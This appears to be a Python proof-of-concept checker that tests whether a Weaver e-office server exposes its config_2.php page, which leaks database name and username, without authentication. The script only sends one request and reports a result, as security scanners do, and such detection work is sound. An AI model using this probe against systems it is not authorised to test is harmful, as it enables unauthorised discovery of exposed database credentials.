import requests
import urllib

def verify(url):
    relsult = {
        'name': '泛微e-office config_2.php未授权访问',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML,like Gecko)',
        'Accept-Encoding': 'gzip, deflate',
        'Connection':'close'
    }
    vurl = urllib.parse.urljoin(url, "/building/backmgr/urlpage/mobileurl/config_2.php")
    try:
        response = requests.get(vurl, headers=headers, timeout=5)
        if response.status_code == 200 and '数据库名' in response.text and '用户名' in response.text:
            relsult['vulnerable'] = True
            relsult['verify'] = vurl
        return relsult

    except:
        return relsult